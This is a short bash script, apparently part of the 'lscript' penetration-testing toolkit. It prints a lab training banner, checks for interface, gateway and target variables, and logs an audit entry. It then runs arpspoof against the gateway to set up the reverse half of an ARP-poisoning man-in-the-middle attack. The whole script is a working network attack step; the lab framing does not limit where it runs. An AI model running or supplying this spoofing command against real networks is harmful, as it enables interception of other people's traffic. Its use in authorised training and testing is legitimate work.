#! /bin/bash
LPATH="${LPATH:-/root/lscript}"
[[ -f "$LPATH/lib/lscript_lab.sh" ]] && source "$LPATH/lib/lscript_lab.sh"
[[ -f "$LPATH/lib/lscript_conf.sh" ]] && source "$LPATH/lib/lscript_conf.sh" && lscript_load_conf && lscript_apply_colors 2>/dev/null

lscript_lab_training_banner

if [[ -z "$GATEINT" || -z "$TARGIP" || -z "$GATENM" ]]
then
	echo -e "Missing GATEINT, TARGIP, or GATENM."
	exit 1
fi
lscript_lab_audit "arp_mitm_reverse" "if=$GATEINT gw=$GATENM target=$TARGIP"
arpspoof -i "$GATEINT" -t "$GATENM" "$TARGIP"
